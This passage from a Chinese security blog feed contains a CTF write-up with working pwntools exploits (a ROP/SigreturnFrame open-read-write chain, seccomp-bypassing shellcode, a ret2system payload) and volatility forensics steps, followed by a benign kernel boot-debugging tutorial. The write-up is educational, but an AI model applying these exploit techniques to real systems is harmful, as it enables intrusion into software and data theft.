class="number">0x100</span>) <span class="comment"># 7</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">pop_rdi_ret_addr += libc.address</span><br><span class="line">pop_rsi_ret_addr += libc.address</span><br><span class="line">pop_rdx_rsi_ret_addr += libc.address</span><br><span class="line">pop_rax_ret_addr += libc.address</span><br><span class="line">syscall_ret_addr += libc.address</span><br><span class="line"></span><br><span class="line">rop_chain_addr = libc.bss()+<span class="number">0x200</span></span><br><span class="line">str_flag_addr = rop_chain_addr + <span class="number">0x80</span></span><br><span class="line">flag_addr = libc.bss() + <span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">rop_chain = p64(pop_rdi_ret_addr) + p64(str_flag_addr) </span><br><span class="line">rop_chain += p64(pop_rsi_ret_addr) + p64(<span class="number">0</span>) </span><br><span class="line">rop_chain += p64(pop_rax_ret_addr) + p64(<span class="number">2</span>) </span><br><span class="line">rop_chain += p64(syscall_ret_addr)</span><br><span class="line">rop_chain += p64(pop_rdi_ret_addr) + p64(<span class="number">3</span>) </span><br><span class="line">rop_chain += p64(pop_rdx_rsi_ret_addr) + p64(<span class="number">0x50</span>) + p64(flag_addr) </span><br><span class="line">rop_chain += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop_chain += p64(pop_rdi_ret_addr) + p64(flag_addr) </span><br><span class="line">rop_chain += p64(libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop_chain))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>) + p64(libc.bss()))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># frame[&#x27;uc_stack.ss_size&#x27;] = libc.sym[&#x27;setcontext&#x27;] + 61</span></span><br><span class="line">frame.rsp = rop_chain_addr</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = rop_chain_addr</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">edit(<span class="number">7</span>, <span class="built_in">str</span>(frame))</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">sh.send(rop_chain+<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h4><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/1.png" class=""><p>保护很红呀</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/2.png" class="" width="2"><p>程序就两个流程一个是<code>user</code>，一个是<code>admin</code>，先来看看<code>user</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================== users ========================&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Sorry,you are only allowed to :&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;1. w&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;2. ls&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;3. pwd&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;4. cat&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;5. rename&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;6. quit&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now you can input the number and execute it:\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>里面就是各种用户态的命令，不过最终都会跳到这，拼接命令最后<code>system</code>执行，这里执行的是<code>xxx &gt; ./result</code>，就是把某某文件写入到<code>result</code>里面去，比赛的时候一直想命令注入，但是这再怎么注入都不可能执行<code>system(&quot;/bin/sh&quot;)</code>的…，它只会把执行命令后的结果写入到<code>result</code>里面去</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/3.png" class=""><p>再来看一些关键的命令，<code>cat</code>命令，就是<code>cat &amp;s</code>的内容</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/4.png" class=""><p><code>input_file_name</code>里面就是读入文件名，里面可以进行<code>&quot;\00&quot;</code>截断，至于为什么要截断，往下看</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/5.png" class=""><p><code>sub_400AC3</code>里面居然在随机我们的文件名，所以你应该知道为什么要截断了吧</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/6.png" class=""><p>那么我们的目标就是很明确了，就是把s改成我们想要读取的文件，比如<code>flag</code>，溢出点就在<code>rename</code>里面，它先把一个变量地址（<code>&amp;v5</code>）传进去，但是进去之后读取23个字节，人家才<code>int_64</code>，你就读23字节进去肯定溢出</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/image-20210913160104319.png" class=""><p>结果很明显，我们可以cat flag到result里面了</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/8.jpg" class=""><p>然后去<code>admin</code>看看，<code>seccomp</code>里面是沙箱，不截图了，禁用了<code>execve</code>，然后就有了<code>orw</code>的想法，并且下面也<code>open</code>了提示已经很明显了，我太菜了没悟出来，</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/9.png" class=""><p>里面有溢出点，具体偏移要手调，但是这里才<code>0x1D</code>的大小，明显不够些<code>read</code>和<code>write</code>的<code>shellcode</code>，那就只能调用<code>sys_read</code>，再读入我们的<code>rw</code>，可恶啊！学到了！</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/10.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;./nologin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;11000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;192.168.39.184&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;user1&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x19</span>-<span class="number">0x4</span>)+<span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input file name:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&gt; \n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;password: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x400a0e&quot;)</span></span><br><span class="line">jmp_esp=<span class="number">0x00000000004016fb</span></span><br><span class="line">shellcode=<span class="string">&#x27;mov eax,0;mov edx,200;syscall&#x27;</span></span><br><span class="line"><span class="comment">#用jmp esp劫持控制流到栈上</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0xd</span>,<span class="string">&#x27;a&#x27;</span>)+p64(jmp_esp)+asm(<span class="string">&#x27;mov bx,21;sub rsp,rbx;jmp rsp&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">shellcode=<span class="string">&#x27;mov edx,200;mov rdi,3;mov rax,0;syscall;mov rdi,1;mov rax,1;syscall;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="comment">#加上0x30是填充之前的指令，因为当前的ip指向0x30这个位置</span></span><br><span class="line">payload=<span class="string">&#x27;c&#x27;</span>*<span class="number">0x30</span>+asm(shellcode)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="BabyROP"><a href="#BabyROP" class="headerlink" title="BabyROP"></a>BabyROP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;BabyRop&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;BabyRop&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;11000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;192.168.39.184&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x804c029</span></span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_got = <span class="number">0x80491D6</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(sys_got)+<span class="string">&#x27;zyen&#x27;</span>+p32(sh))</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_got = u32(io.recvuntil(&#x27;\x7f&#x27;)[-4:])</span></span><br><span class="line"><span class="comment"># print(hex(put_got))</span></span><br><span class="line"><span class="comment"># io.sendline(&#x27;\x00\x6a&#x27;+shellcode)</span></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Baby–forenisc"><a href="#Baby–forenisc" class="headerlink" title="Baby–forenisc"></a>Baby–forenisc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>其他都扫了一边只有这个有信息，它提示把<code>flag</code>放到<code>git</code>上了</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/image-20210913184100548.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 filescan | grep -E <span class="string">&#x27;txt&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/13.png" class=""><p>把它<code>dump</code>出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./volatility_2.6_lin64_standalone -f 1.raw --profile=WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D ./</span><br></pre></td></tr></table></figure><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/14.png" class=""><p>放到<code>putty genera</code></p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/11.png" class=""><p>获取一个邮箱，之前说<code>flag</code>再<code>git</code>上我们直接<code>github</code>上搜</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/15.png" class=""><p>文件打开翻一下找到，官方<code>wp</code>说这是一个微信小程序的文件，本来是需要通过工具进行解包的，但是没想到<code>flag</code>以<code>base64</code>的形式写到这里面了…</p><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/16.png" class=""><img src="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/17.png" class="">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>和kernel说个Hello吧！（一）</title>
      <link href="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>或许是最近飘了，想开始学习内核了，看到《庖丁解牛linux内核》这本书之后，萌发了一个调试内核的想法，所以这个系列应运而生，在最开始学习计算机的时候，都是从写Hello World！开始的，所以当我开始内核的时候，也想着延续这个传统（其实的听到<code>xuanxuan</code>老师讲到的😀），这篇文章是我第一次接触内核所写的文章，其实一直以来我都在好奇，如此庞大的操作系统到底是怎么启动起来的，本文旨在通过调试从<code>start_kernel</code>到<code>init</code>进程启动的过程来了解<code>linux</code>到底是怎么样启动起来的，如果你也想知道这个问题的答案，那就跟我看下去吧！</p></blockquote><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>要想调试首先就得有一个<code>linux</code>来调对不对，先搭建一个简单的<code>linux</code>内核，通过编译内核代码加上根文件系统来构建一个简单的操作系统，先去下载<a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.18.6.tar.xz"><code>linux</code>内核源码</a>，虚拟机的网络（可能是源的问题吧）实在不太行，下载完成之后千万千万要注意不要在<code>windows</code>下面解压，因为在<code>linux</code>源码里面有个文件叫<code>aux.c</code>，这玩意和<code>windows</code>下的设备名为同一个名字，解压出来之后，会删除不了此文件，如果真的一不小心解压出来了，下面为解决办法，解铃还需系铃人啊！：</p><p><a href="https://www.191e.com/pc/23327.html">win10系统下aux.c、aux.h格式文件无法删除的解决方法</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir kernel</span><br><span class="line"><span class="built_in">cd</span> kernel</span><br><span class="line"><span class="comment">#把linux源码放进kernel文件夹</span></span><br><span class="line">xz -d linux-3.18.6.tar.xz </span><br><span class="line">tar -xvf linux-3.18.6.tar </span><br><span class="line"><span class="built_in">cd</span> linux-3.18.6 </span><br><span class="line">make i386_defconfig </span><br><span class="line">make </span><br></pre></td></tr></table></figure><p>开始<code>make</code>之后，又报错下面两条错，原因很明显就是确实有个文件，在<code>github</code>中找到其他人的文件放到它提示的目录中就能开始编译啦！（你也可能不缺，具体看系统的内核版本）</p><p><a href="https://github.com/murata-wireless/cyw-fmac/tree/master/backport-include/linux">compiler-gcc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include/linux/compiler-gcc.h:106:1: fatal error: linux/compiler-gcc9.h: 没有那个文件或目录</span><br><span class="line"></span><br><span class="line">include/linux/compiler-gcc9.h:1:10: fatal error: linux/compiler-gccN.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p><code>make</code>是个漫长的过程，需要静静等待….</p><p>编译完成之后就是搭建根文件系统：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..<span class="comment">#退出到kernel目录</span></span><br><span class="line">mkdir rootfs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mengning/menu.git  <span class="comment">#把menuOS的源码拉下来</span></span><br><span class="line"><span class="built_in">cd</span> menu</span><br><span class="line">gcc -o init linktable.c menu.c test.c -m32 -static –lpthread</span><br><span class="line"><span class="built_in">cd</span> ../rootfs</span><br><span class="line">cp ../menu/init ./</span><br><span class="line">find . | cpio -o -Hnewc |gzip -9 &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>报这个错在命令行输入：<code>apt install gcc-multilib</code>就行了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: bits/libc-header-start.h: 没有那个文件或目录</span><br></pre></td></tr></table></figure><p>外事具备！接下来就是启动它了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append <span class="string">&quot;console=ttyS0&quot;</span> -nographic</span><br></pre></td></tr></table></figure><p>上面命令的解释：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  <span class="comment">#qemu的system模式进行全量模拟，架构为x64</span></span><br><span class="line">-kernel <span class="comment">#指定内核镜像的位置</span></span><br><span class="line">-initrd <span class="comment">#根文件系统的位置</span></span><br><span class="line">-append <span class="string">&quot;console=ttyS0&quot;</span>  <span class="comment">#启动后传入的参数</span></span><br><span class="line">-nographic<span class="comment">#在本地终端启动</span></span><br></pre></td></tr></table></figure><p>之后就可以看到<code>menuOS</code>启动起来了！虽然这个比较顺利但还是泪目了：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""><p>但是此处的<code>menuOS</code>是不包含调试信息的，需要重新编译让它包含调试信息，我们进到<code>linux-3.18.6</code>文件里面输入<code>make menuconfig </code>会进入下面的页面</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class=""><p>根据以下路径修改使得编译的时候附上调试信息：</p><p><code>kernel hacking  —&gt; Compile-time checks and compiler options -&gt; compile the kernel with debug info</code>（对它按<code>y</code>就能打开调试信息）</p><p>之后再<code>make</code>就可以重新编译啦！</p><p>又是一段漫长的时光….</p><h3 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h3><blockquote><p>使用 <code>gdb</code> 跟踪调试内核，加两个参数，一个是<code>-s</code>（在 1234 端口上创建了一个 <code>gdb-server</code>， 读者可以另外打开一个窗口，用 <code>gdb</code> 把带有符号表的内核镜像加载进来，然后连接 <code>gdb-server</code>，设置断点跟踪内核。若不想使用 1234 端口，可以使用<code>-gdb tcp:xxxx</code> 来取代<code>-s</code> 选项）， 另一个是<code>-S</code>（CPU 初始化之前冻结起来）</p></blockquote><p>在之前的命令当中加上<code>-S -s</code>参数就可以让内核停下来等待连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append &quot;console=ttyS0&quot; -nographic -S -s</span><br></pre></td></tr></table></figure><p>之后就能用<code>gdb</code>连上了：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class=""><p>一连接发现报错了，仔细一看是架构出现了问题，<code>set architecture i386:x86-64</code>即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">warning: Selected architecture i386 is not compatible with reported target architecture i386:x86-64</span><br><span class="line">warning: Architecture rejected target-supplied description</span><br><span class="line">Remote <span class="string">&#x27;g&#x27;</span> packet reply is too long (expected 312 bytes, got 608 bytes): 000000000000000000000000000000000000000000000000b10f060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0ff0000000000000200000000f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007f0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000801f0000</span><br></pre></td></tr></table></figure><p>这里还看到一些很奇怪的玩意：<code>i386:x86-64</code>其实就是<code>x64</code>，名字不同罢了，<code>i386:x86-64:intel</code>估摸着应该是汇编的格式不同，但这个就很离谱了，<code>i386:x64-32</code>，惊奇！！！<code>x64</code>居然还有32位的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture </span><br><span class="line">Requires an argument. Valid arguments are i386, i386:x86-64, i386:x64-32, i8086, i386:intel, i386:x86-64:intel, i386:x64-32:intel, i386:nacl, i386:x86-64:nacl, i386:x64-32:nacl, auto.</span><br></pre></td></tr></table></figure><p>其实就是为了节省内存所衍生出来的产物，但好像不太常见，至少现在没见过….</p><blockquote><p>寄存器是 64 位的，但指针只有 32 位，在大量指针的工作流中节省了大量内存。它还确保所有其他仅 64 位处理器功能可用。</p></blockquote><p>再次连接就进入了调试界面，可以看到此处第一条指令是<code>0xfff0</code>：</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""><p>至此就可以正常的进行调试了，接下来将展现<code>linux</code>操作系统启动的方方面面，看到这里，你可能会疑惑为什么是从<code>start_kernel</code>开始调试，你可能会说它就是内核的起点，一切的一切都从这里开始，说的对，但也不对，因为如果说一切的一切都从这里开始的话，那进入<code>start_kernel</code>的栈是哪里来的？断点打在<code>start_kernel</code>上按下<code>c</code>的时候为什么处在冻结状态的内核会闪过一些字符？所以它并不是一切的起点，再次之前还有很多用汇编编写的代码来完成硬件系统的初始化工作，为 C 代码的运行设置环境，那为啥还是得从<code>start_kernel</code>开始调试呢？因为之前都是硬件层面的初始化，在这我们真正想研究或者说想弄明白的是如此庞大的操作系统到底是怎么样启动起来的！并且在这留下几个问题：</p><ul><li><code>idle</code>进程是什么，它是怎么来的，它的作用是什么？</li><li>0号进程是什么？1号呢？2号呢？1号进程和2号进程的作用又是什么呢？</li><li>内核启动完成以后处于一个什么状态当中？</li></ul><p>下面是它的源码，可以看到有很多初始化，包括<code>trap_init</code>（中断向量的初始化），<code>mm_init</code> （内存管理模块的初始化）等等….只能选择几个比较重要的来分析并解决上面的问题（毕竟能力有限很多东西还得再沉淀沉淀才能搞明白）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 